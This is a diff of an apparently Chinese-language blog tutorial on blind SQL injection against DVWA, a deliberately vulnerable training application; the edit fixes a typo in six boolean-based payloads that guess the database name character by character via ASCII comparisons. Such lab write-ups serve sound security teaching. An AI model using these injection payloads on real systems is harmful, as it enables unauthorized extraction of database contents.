@@ -112,7 +112,7 @@
 <meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-blind-1.png">
 <meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-blind-2.png">
 <meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-13.png">
-<meta property="og:updated_time" content="2018-01-18T04:36:38.161Z">
+<meta property="og:updated_time" content="2018-01-18T04:50:20.471Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DVWA之SQL Injection(Blind)">
 <meta name="twitter:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
@@ -345,7 +345,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-01-18T12:36:38+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2018-01-18T12:50:20+08:00">
                 2018-01-18
               </time>
             
@@ -495,12 +495,12 @@
 <p>说明数据库名长度为4。</p>
 <p>下面采用二分法猜解数据库名。</p>
 <blockquote>
-<p>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
-<p>输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
-<p>输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
-<p>输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
-<p>输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p>
-<p>输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p>
+<p>输入1’ and ascii(substr(database(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p>
 <p>…</p>
 </blockquote>
 <p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
